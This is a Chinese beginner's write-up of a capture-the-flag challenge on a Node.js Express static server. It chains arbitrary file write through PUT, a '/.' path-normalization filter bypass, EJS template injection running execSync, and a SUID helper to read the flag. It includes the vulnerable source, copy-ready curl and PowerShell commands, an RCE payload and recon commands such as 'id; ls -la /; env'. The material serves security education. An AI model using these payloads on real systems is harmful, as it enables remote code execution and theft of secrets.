# Node.js 静态服务器 · 夺旗全解（零基础版）

> 本教程用一道真实 CTF 题（东北林业大学比赛平台 Node.js 静态服务器题）把整套打法讲透：
> **任意文件写入 + 解析差异绕过 + EJS 模板注入 + SUID 提权**。
> 读法：从头按顺序读，每节都是下一节的前提。所有命令可直接复制到 PowerShell 里跑。
> 内容比一般 writeup 更啰嗦——因为每一处"为什么"都补了底层知识，零基础也看得懂。

---

## 目录

| 章节 | 内容 | 谁需要读 |
|---|---|---|
| 1. 这道题是什么 | 题目 + 目标 + 最终答案 | 所有人 |
| 2. 逐行读懂代码 | Node.js 源码逐段翻译 | 所有人 |
| 3. 六个必须先懂的概念 | HTTP / 中间件 / req.path / 路径规范化 / 模板渲染 / 权限位 | 零基础必读 |
| 4. 攻击思路总览 | 一句话讲清整个打法 | 所有人 |
| 5. 第一步：侦察 | 目录列表 + 源码泄露（为什么 static 在过滤前就能下源码） | 所有人 |
| 6. 第二步：构造 payload | base64 是干什么的、为什么模板要先编码 | 零基础必读 |
| 7. 第三步：PUT 写文件 | HTTP 方法语义 + JSON body + Content-Type 的坑 | 所有人 |
| 8. 第四步：绕过过滤 | 正则 vs path.join 的解析差异（图解）+ curl 规范化陷阱 | 零基础必读 |
| 9. 第五步：触发模板渲染 | res.render 怎么找文件 + EJS 三种标签 | 零基础必读 |
| 10. 第六步：提权读 flag | 权限位逐位解读 + SUID + 环境变量泄露 | 所有人 |
| 11. 完整命令序列 | 照抄版 | 所有人 |
| 12. 每题通用的隐藏知识点 | 报错泄露 / fs 行为 / execSync / 版本差异 | 零基础必读 |
| 13. 复盘：考点对照表 | 本题考点 → 知识库对应条目 | 所有人 |

---

## 1. 这道题是什么

**目标**：`http://contest.ctf.nefu.edu.cn:31744/`（出题人的服务器，GZCTF 平台）

**题目给你什么**：
- 一个页面：打开是一个**文件列表**（列出了服务器目录里的文件：`App.js`、`node_modules`、`package.json`……）
- 一份**源码**：直接访问 `/App.js` 就能看到完整代码（为什么能看？见第 5 步）
- 一个 PUT 接口：允许你"往服务器传文件"（见第 7 步）

**题目藏了什么**：服务器上有个 `/flag` 文件，但权限只有 root 能读；另外根目录有个 SUID 程序 `/readflag` 可以替你读。

**你要做的事**：利用"能传文件 + 能渲染模板"这两件事，让服务器执行你的代码，然后用 `/readflag` 把 flag 读出来。

**最终答案**：

```
flag{a43b1e4a-****-****-****-************}
```

> 注意：GZCTF 平台每次重开实例会换新 flag，如果提交不对就重打一遍拿新的。

---

## 2. 逐行读懂代码

题目源码（`App.js`）如下，我们逐段翻译：

```js
const express = require('express');   // 引入 Express 框架（Node 最流行的 Web 框架）
const ejs = require('ejs');           // 引入 EJS 模板引擎（用 HTML 模板里嵌 JS）
const fs = require('fs');             // 文件系统模块（读写文件）
const path = require('path');         // 路径模块（拼接/规范化路径）

const app = express();
const PORT = parseInt(process.env.PORT) || 3000;

app.set('view engine', 'ejs');        // ① 声明：渲染模板用 EJS 引擎
app.use(express.json({ limit: '1mb' })); // ② 中间件：解析 JSON 请求体

const STATIC_DIR = path.join(__dirname, '/');  // 静态文件根目录 = 当前代码目录

// ③ 核心函数：渲染一个"文件列表页面"
function serveIndex(req, res) {
    var templ = req.query.templ || 'index';   // 模板名 = URL 参数 ?templ= 的值（没传默认 index）
    var lsPath = path.join(__dirname, req.path);
    try {
        res.render(templ, {                   // ← 危险：templ 用户可控，直接拿去渲染
            filenames: fs.readdirSync(lsPath),// 列出这个目录里的文件名
            path: req.path
        });
    } catch (e) {
        res.status(500).send('Error rendering page');
    }
}

// ④ 中间件1：静态文件服务（见第 5 步详解）
app.use(express.static(STATIC_DIR));

// ⑤ 中间件2：过滤中间件（见第 8 步详解）
app.use((req, res, next) => {
    if (typeof req.path !== 'string' ||
            (typeof req.query.templ !== 'string' && typeof req.query.templ !== 'undefined'))
        res.status(500).send('Error parsing path');
    else if (/js$|\.\./i.test(req.path)) res.status(403).send('Denied filename');
    else next();
})

// ⑥ 中间件3：路径以 / 结尾 → 渲染文件列表
app.use((req, res, next) => {
    if (req.path.endsWith('/')) serveIndex(req, res);
    else next();
})

// ⑦ PUT 接口：任意文件写入！（见第 7 步详解）
app.put('/*', (req, res) => {
    const filePath = path.join(STATIC_DIR, req.path);   // 目标路径 = 静态目录 + 请求路径
    if (fs.existsSync(filePath)) {
        return res.status(500).send('File already exists');  // 文件已存在就拒绝
    }
    fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'), (err) => {
        // 把请求体里的 content 字段（base64 编码）解码后写入文件
        if (err) return res.status(500).send('Error writing file');
        res.status(201).send('File created/updated');
    });
});

app.listen(PORT, ...);
```

**一句话总结代码**：这网站 = 一个能列目录的静态文件服务器 + 一个能往服务器写文件的接口 + 一个能渲染任意模板的接口。三个功能凑在一起，就是 RCE（远程代码执行）的温床。

---

## 3. 六个必须先懂的概念

### 概念 A：HTTP 请求的结构

浏览器/工具发给服务器的每个请求长这样（以 `GET /App.js?a=1&b=2` 为例）：

```
GET /App.js?a=1&b=2 HTTP/1.1
Host: contest.ctf.nefu.edu.cn:31744
```

- **方法**：`GET`（要东西）、`POST`（提交数据）、`PUT`（把内容放到指定位置）、`DELETE`（删除）等
- **路径**：`/App.js` —— 服务器用它决定"你要哪个资源"
- **查询串（query）**：`?a=1&b=2` —— 附加参数，`req.query.templ` 就是从这取的
- **请求头（Header）**：`Host`、`Content-Type` 等，是附加说明
- **请求体（Body）**：POST/PUT 时携带的数据，比如 JSON

> 关键区分：**路径**和**查询串是两段东西**。后面第 8 步的绕过、第 6 步的 base64，全都靠这个区分。

### 概念 B：Express 中间件 = 排队的安检员

Express 的处理流程：请求进来 → **按注册顺序**过一道道"中间件"函数 → 每个中间件决定**放行（next()）还是拦截（直接响应）**。

```js
app.use(中间件1);   // 先过 1
app.use(中间件2);   // 再过 2
app.use(中间件3);   // 再过 3
app.put('/*', 处理器); // 最后才到 PUT 处理器
```

三个关键规则：
1. **顺序就是权力**：排在前面的中间件先执行，先执行的人"说了算"
2. **命中即短路**：如果某个中间件直接响应了（比如 static 找到了文件直接返回内容），**后面的就都不执行了**
3. **app.use 对所有方法生效**：无论 GET/PUT/POST，只要走到这层就会被检查

> 这道题最大的坑就藏在规则 1 和 2 里：`express.static`（能直接吐文件）排在过滤中间件**之前**。见第 5 步。

### 概念 C：req.path 到底是什么

`req.path` 是 Express 提供的"当前请求的路径"。它由 `parseurl` 库生成，有个重要特性：**它是 URL 的原始字符串**——

- 不解析 `%xx` 编码：URL 里写 `%2e`，`req.path` 里就是字面 `%2e`，不是 `.`
- 不折叠 `.` / `..`：URL 里写 `/views/x.ejs/.`，`req.path` 里**原样保留**
- 不含查询串：`?templ=x` 不属于路径

这个特性决定了过滤正则看到的永远是"原始字符串"，也解释了为什么后面编码绕过无效（第 8 步细说）。

### 概念 D：path.join 会"规范化"路径

`path.join('/App', '/views/x.ejs/.')` 的结果是 **`/App/views/x.ejs`**。

它会做三件事：拼接、把 `..` 往上跳一级、**把多余的 `/` 和 `/.` 折叠掉**。也就是说：**你传给它什么"脏"路径，它给你吐一个"干净"路径**。

> 这就是整道题的命门：**过滤看的是原始字符串（概念 C），文件系统用的是规范化后的路径（概念 D）——两者对同一个输入的理解不一样。**

### 概念 E：模板渲染 = 把模板内容当 JS 执行

EJS 模板就是 HTML 里嵌 JS。`res.render('xxx')` 的执行流程（见第 9 步详解）：

1. 在 `views/` 目录里找 `xxx.ejs` 文件
2. 把文件内容**编译成一个 JS 函数**
3. **执行**这个函数，把结果作为网页返回

关键结论：**谁能控制模板文件的内容，谁就能让服务器执行任意 JS 代码。** 模板里的 `<% ... %>` 不是文本，是代码。

### 概念 F：Linux 权限位

`ls -l` 输出的第一列是 10 个字符，逐位解读：

```
- r w -   r - -   r - -    属主 属组 其他
```
- 第 1 位：`-` 普通文件 / `d` 目录 / `l` 链接
- 2-4 位：属主（文件主人）的 读(r)写(w)执行(x)
- 5-7 位：属组的权限
- 8-10 位：其他用户的权限

特殊位 `s`（SUID）：出现在属主执行位时（`-rwsr-xr-x`），意思是**任何人执行这个程序，程序都以"属主身份"运行**。属主是 root 的 SUID 程序 = 给了你一个 root 权限的入口。

> 类比：普通用户进大楼要刷卡（权限），但有个"门卫程序"带 root 权限，你叫它帮你开门它就开了——SUID 就是这个门卫。

---

## 4. 攻击思路总览

**一句话**：让服务器把"我们自己写的文件"当成"模板"渲染，模板里的 JS 就会执行；执行后调用 SUID 程序 `/readflag` 读出 flag。

展开成五步：

```
① 侦察：下源码，找出可利用点
② 构造：写一段"执行命令"的 EJS 模板
③ 上传：用 PUT 接口把模板写进 views 目录（绕过滤）
④ 触发：用 ?templ= 让服务器渲染它 → 命令执行
⑤ 提权：/flag 读不了 → 用 SUID 程序 /readflag
```

---

## 5. 第一步：侦察——为什么源码白拿

### 命令

```powershell
curl.exe http://contest.ctf.nefu.edu.cn:31744/
curl.exe http://contest.ctf.nefu.edu.cn:31744/App.js
curl.exe http://contest.ctf.nefu.edu.cn:31744/package.json
```

### 原理：中间件顺序（概念 B）

代码里 `express.static(STATIC_DIR)` 是**第 1 个中间件**，过滤规则是**第 2 个**。当请求 `GET /App.js`：

1. static 中间件先执行 → 在静态目录里**找到了 App.js 这个文件** → **直接返回文件内容，短路！**
2. 第 2 个过滤中间件根本没机会执行 → `js$` 规则形同虚设

> 这就是"中间件顺序错误"漏洞：**防御必须放在资源服务之前，放在之后就是摆设。**
> 同类场景：nginx 配置里 `location /` 先于 `location /admin` 的匹配错误、Java 过滤器注册顺序错误，全是这个思路。

### 侦察的收获

- 目录列表泄露出：`App.js`、`node_modules`、`package-lock.json`、`package.json`、`views/`
- `package.json` 泄露出依赖版本：`express ^4.19.2`、`ejs 3.1.10`（判断漏洞可用性）
- 源码暴露三个可利用点：`res.render(templ)`、PUT 写文件、`js$|\.\.` 过滤

> 方法论：**拿到题目先下源码/读代码，比盲目打请求高效一个数量级。** 源码就是出题人给你的"地图"。

---

## 6. 第二步：构造 payload——base64 是干什么的

### 模板内容（payload）

```ejs
<%- process.getBuiltinModule('child_process').execSync('/readflag') %>
```

含义：渲染时执行 `execSync('/readflag')`（运行系统命令），并把输出**原样**写进页面（`<%-` 的作用见第 9 步）。

### 为什么先要 base64？

看代码第 ⑦ 处：`Buffer.from(req.body.content, 'base64')` —— 服务器把请求体里 `content` 字段的值**按 base64 解码**后写文件。

所以我们要把模板内容先 base64 编码，再放进 JSON 的 `content` 字段。base64 是"用 64 个字符表示任意二进制数据"的编码，任何文本/二进制都能编码成纯字符，方便塞进 JSON。

### 在 PowerShell 里做（三行）

```powershell
$tpl = "<%- process.getBuiltinModule('child_process').execSync('/readflag') %>"
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tpl))
$body = @{ content = $b64 } | ConvertTo-Json -Compress
Set-Content body.json -Value $body -Encoding utf8
```

三行的作用：第 1 行定义模板 → 第 2 行 base64 编码 → 第 3 行包成 JSON 并写进文件（`--data-binary "@body.json"` 时 curl 会读这个文件）。

可以 `Get-Content body.json` 验证，输出形如 `{"content":"PGUt..."}`。

---

## 7. 第三步：PUT 写文件

### 命令

```powershell
curl.exe -X PUT "http://contest.ctf.nefu.edu.cn:31744/views/test.ejs" -H "Content-Type: application/json" --data-binary "@body.json"
```

### HTTP 方法语义（概念 A）

- `PUT` 的语义是"**把这个内容放到这个路径**"——正好对应代码里 `app.put('/*', ...)` 路由
- 写文件的路径 = URL 的路径部分 → `/views/test.ejs` 就是写进 `views/test.ejs`

### Content-Type 的坑（概念 A 的应用）

`-H "Content-Type: application/json"` **不能少**。因为 `express.json()` 这个中间件**只解析 Content-Type 是 `application/json` 的请求体**。如果不带这个头：

- `req.body` 是 `undefined`（或空对象）
- 代码执行 `req.body.content` → 报错 → 500

> 方法论：**中间件只处理"它认识的格式"。** 传 JSON 就必须声明 `application/json`，否则后端解析不到你的数据。

### 预期结果

```
Denied filename        ← 403，被过滤拦了（第 8 步解决）
```

---

## 8. 第四步：绕过过滤——全题最精髓的一步

### 过滤规则是什么

```js
else if (/js$|\.\./i.test(req.path)) res.status(403).send('Denied filename');
```

两个条件，命中就 403：
- `js$`：路径**以 js 结尾**（大小写不敏感）
- `\.\.`：路径里**包含两个点 `..`**

`/views/test.ejs` 结尾是 `ejs`，而 `ejs` 的最后两个字符正好是 `js` → **被拦**。

### 为什么必须叫 `.ejs`

`res.render('test')` 找文件时（第 9 步详解）：模板名没写扩展名，Express 会自动**补上 `.ejs`** 去找 `views/test.ejs`。所以能被渲染的文件，名字**必须是 `xxx.ejs` 结尾**。

> 于是矛盾出现：能被渲染的文件名必须以 `js` 结尾（会被拦），不行的名字又渲染不了。**出题人就是拿这个矛盾考你**。

### 解法：解析差异（概念 C × 概念 D）

请求 `PUT /views/test.ejs/.`（路径尾巴多一个 `/.`）：

```
过滤正则看到的 req.path：  "/views/test.ejs/."
                          结尾是 "."，不是 "js" → 放行 ✅
                          没有 ".."           → 放行 ✅

path.join 得到的落盘路径：  path.join("/App", "/views/test.ejs/.")
                          = "/App/views/test.ejs"   ← "/." 被规范化吞掉
```

**正则看到的是原始字符串，文件系统用的是规范化后的路径——两个解析器对同一输入理解不一致，这就是"解析差异"漏洞。**

同类"解析差异"例子（换个语言同样思路）：
- PHP 的 `%00` 截断：正则看 `shell.php%00.jpg` 觉得是 `.jpg`，文件系统在 `%00` 处截断认为是 `shell.php`
- 路径穿越编码：`..%2f` —— 正则不识别 `%2f`，文件系统解码后识别为 `/`
- 请求走私：nginx 和 Node 对 `Content-Length`/`Transfer-Encoding` 理解不一致

> 方法论：**只要过滤是"字符串匹配"，而目标函数是"解析路径"，就有解析差异可挖。** 看到 `path.join`/`path.resolve`/文件读写 + 黑名单正则，先想这个。

### 隐形坑：curl 自己会规范化 URL！

第一次打的时候返回的不是 403 也不是成功，而是 500 `Error rendering page`，排查半天发现是 **curl 的锅**：

- curl（libcurl）默认会**自己把 URL 里的 `/.` 折叠掉**，把请求偷偷改成 `/views/test.ejs/`
- `/views/test.ejs/` 结尾是 `/` → 命中代码第 ⑥ 处 `endsWith('/')` → 走了 serveIndex → `readdirSync` 读一个**文件**报错 → 500

解决：加 `--path-as-is` 参数，让 curl **原样发送** URL：

```powershell
curl.exe --path-as-is -X PUT "http://contest.ctf.nefu.edu.cn:31744/views/test.ejs/." -H "Content-Type: application/json" --data-binary "@body.json"
```

预期结果：

```
File created/updated    ← 201，写文件成功！
```

验证文件真的落盘了：

```powershell
curl.exe http://contest.ctf.nefu.edu.cn:31744/views/test.ejs
```

预期：直接看到你模板的原文（static 把文件原样吐出来）。

> 坑点清单：① curl 默认折叠 `/.`，必须 `--path-as-is`；② 路径结尾多 `/.` 别写成 `..`（会被 `\.\.` 拦）；③ 每次换 payload 要换文件名（见第 12 节 fs 行为）。

---

## 9. 第五步：触发模板渲染

### 命令

```powershell
curl.exe "http://contest.ctf.nefu.edu.cn:31744/?templ=test.ejs"
```

### res.render 找文件的机制（概念 E 展开）

`res.render('test.ejs')` 的完整流程（Express 内部 `lib/view.js`）：

1. **确定目录**：`views` 设置（没配置时默认 `当前工作目录/views`）→ 就是 `views/`
2. **确定扩展名**：模板名 `test.ejs` 自带 `.ejs`，直接用；如果模板名没扩展名（比如 `?templ=test`），自动补 `.ejs` → 找 `views/test.ejs`
3. **确定引擎**：`.ejs` 扩展名 → 加载 `require('ejs').__express` 作为渲染引擎
4. **渲染**：读文件 → 编译 → 执行 → 输出

> 这就是为什么第 8 步必须把文件**写成 `xxx.ejs` 且放进 `views/` 目录**——每一步都是这套机制决定的。

### EJS 三种标签的区别（为什么用 `<%-`）

| 标签 | 作用 | 输出是否转义 |
|---|---|---|
| `<% JS %>` | 执行代码，不输出（if/for 循环用） | — |
| `<%= JS %>` | 执行并输出 | **转义** HTML 特殊字符（`<` → `&lt;`） |
| `<%- JS %>` | 执行并输出 | **不转义**，原样输出 |

payload 用 `<%-` 的原因：命令输出的内容如果恰好含 `<` `>` `&` 等字符，`<%=` 会把它们转义成实体，看着很怪；`<%-` 保证**原样显示**。

### 触发后的效果

`?templ=test.ejs` → serveIndex → `res.render('test.ejs')` → 我们模板里的 `execSync('/readflag')` 被执行 → 输出回到页面。

如果直接 `cat /flag`，预期看到：

```
Error: /App/views/test.ejs:1
>> 1| <%- ...execSync('cat /flag') %>
Command failed: cat /flag
cat: /flag: Permission denied
```

**报错本身也是信息**（第 12 节详说）：它泄露了绝对路径 `/App/`、Node 版本、代码结构。

---

## 10. 第六步：提权读 flag

### 为什么 cat /flag 失败

```
-r-------- 1 root root 43 Sep 13 02:29 flag
```

逐位解读（概念 F）：`-` 普通文件 + 属主 root 可读 + **属组和其他用户无任何权限**。而服务运行用户是 `uid=1000(node)`——不是 root，也不是属组 → 读不了。

### 侦察命令

```powershell
# 通过模板执行（把 payload 换成下面这句）
<%- process.getBuiltinModule('child_process').execSync('id; ls -la /; env') %>
```

关键发现：
- `id` → `uid=1000(node) gid=1000(node)`：普通用户
- `ls -la /` → 根目录躺着 `-rwsr-xr-x 1 root root readflag`
- `env` → 环境变量里有 `GZCTF_FLAG=flag{...}`（GZCTF 平台惯例：flag 同时放环境变量）

### 用 SUID 程序（概念 F 的应用）

`readflag` 权限 `-rwsr-xr-x`：`s` 在属主执行位 = **SUID**，属主是 root → **任何人执行它，它都以 root 身份运行**。这种"锁住 /flag、给一个 SUID 读旗助手"是 CTF 平台的标准设计。

把 payload 换成：

```ejs
<%- process.getBuiltinModule('child_process').execSync('/readflag') %>
```

触发渲染 → 输出：

```
flag{a43b1e4a-****-****-****-************}
```

---

## 11. 完整命令序列（照抄版）

```powershell
# ① 侦察
curl.exe http://contest.ctf.nefu.edu.cn:31744/
curl.exe http://contest.ctf.nefu.edu.cn:31744/App.js

# ② 构造 payload（执行 /readflag）
$tpl = "<%- process.getBuiltinModule('child_process').execSync('/readflag') %>"
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tpl))
$body = @{ content = $b64 } | ConvertTo-Json -Compress
Set-Content body.json -Value $body -Encoding utf8

# ③ 写文件（关键：--path-as-is + 路径结尾 /.）
curl.exe --path-as-is -X PUT "http://contest.ctf.nefu.edu.cn:31744/views/x.ejs/." -H "Content-Type: application/json" --data-binary "@body.json"
#    → File created/updated (201)

# ④ 触发模板渲染
curl.exe "http://contest.ctf.nefu.edu.cn:31744/?templ=x.ejs"
#    → flag{...}
```

---

## 12. 每题通用的隐藏知识点（本题用到但没在步骤里展开的）

### 12.1 报错信息泄露 = 免费侦察

第 9 步那次"失败"的报错页面泄露了三样东西：
- 绝对路径：`/App/views/x.ejs` → 确认应用目录是 `/App`
- Node 版本与内部结构：`node:internal/errors:985` 这类栈 → 判断 Node 新旧
- 代码行号与模板内容 → 确认 payload 确实执行到了 execSync

> 方法论：**让目标报错，把报错当侦察工具。** 报错里常见泄露：绝对路径、框架版本、库版本、数据库结构、堆栈里的代码。

### 12.2 fs 的两个行为决定了攻击姿势

- **`fs.writeFile` 不会自动创建目录**：目标目录不存在会直接 ENOENT 报错 → 所以只能往**已存在**的目录写（本题能用的就是 `views/` 和根目录）。想写 `views/新建子目录/x.ejs` 会失败。
- **`fs.existsSync` 检查导致不能覆盖**：已存在的文件会 500 `File already exists` → 每次换 payload **必须换文件名**（x.ejs → y.ejs → z.ejs）。

### 12.3 execSync 的细节

- 默认经过 `/bin/sh -c` 执行 → 支持 `;`、`|`、`&&` 拼接（命令注入基础）
- 输出是 **Buffer**（二进制对象）→ 直接拼进页面时最好 `.toString()`
- **命令失败会抛异常**，异常里带着 stdout → 我们的错误信息就是通过这条路泄露回来的

### 12.4 Node 版本差异（取 child_process 的方式）

| Node 版本 | 取 `child_process` 的方式 |
|---|---|
| ≤ 13（老） | `process.mainModule.require('child_process')` |
| 14 ~ 22.2 | `process.mainModule` 已移除，需要别的链 |
| ≥ 22.3（本题 24.10） | `process.getBuiltinModule('child_process')` |

> 打题前先想办法确认 Node 版本（报错栈、`env`、`process.version`），再选对应的取模块方式。

### 12.5 HTTP 状态码 = 中间件分支的指纹

| 状态码 | 含义 | 本题对应 |
|---|---|---|
| 403 | 被过滤拦 | `js$` / `\.\.` 命中 |
| 500 + "Error rendering page" | 进了 serveIndex 且出错 | 路径以 `/` 结尾 / 读文件失败 |
| 500 + "File already exists" | 文件已存在 | existsSync 检查 |
| 500 + "Error writing file" | 写盘失败 | 目录不存在等 |
| 201 | 写文件成功 | PUT 成功 |

> 方法论：**用状态码判断自己打到了哪一层中间件**，像雷达一样定位自己在攻击链上的位置。

### 12.6 环境变量 = 常被忽略的 flag 藏身处

`env` 一下就能看到：`GZCTF_FLAG=flag{...}`。GZCTF / CTFd 等平台经常把 flag 同时写进环境变量，RCE 之后第一件事除了 `ls /`、`cat /flag`，**别忘了 `env` 和 `printenv`**。

---

## 13. 复盘：考点对照表

| 本题考点 | 原理一句话 | 知识库对应条目 |
|---|---|---|
| 源码泄露 | 中间件顺序错误：static 在过滤之前，命中即短路 | `12-middleware` 中间件顺序 |
| 任意文件写入 | PUT 接口 base64 解码写盘，无路径白名单 | `08-server` 文件上传/写 |
| 解析差异绕过 | 正则看原始字符串，path.join 做规范化 | `11-lang` 的 `node-traversal-ejs-vm` 路径规范化 |
| 模板注入 SSTI | 用户可控模板内容/模板名 → EJS 编译执行 | `06-injection` 模板注入 |
| 命令执行 | `child_process.execSync` 走 shell | `06-injection` 命令注入 |
| SUID 提权 | `s` 位 = 以属主身份运行 | `10-linux` / `14-exploit` SUID |
| 环境变量泄露 | `env` 里的 GZCTF_FLAG | `13-recon` 信息收集 |
| 报错信息泄露 | 错误页带绝对路径/版本/堆栈 | `13-recon` 指纹与信息泄露 |

---

## 附：本地复现靶场（练手用）

想亲手重打一遍（不碰线上）：在本地建个目录，放同样的 `App.js` 和 `views/index.ejs`，装依赖后启动：

```powershell
mkdir node-ctf-lab; cd node-ctf-lab
# （把 App.js 和 views/index.ejs 放进来，再放个 flag.txt 当靶子）
npm install express@4 ejs
node app.js
# 然后把第 11 节的命令里地址换成 http://127.0.0.1:3000 即可
```

> 本地练的时候 payload 可以写 `cat flag.txt`（本地没有 /readflag）。
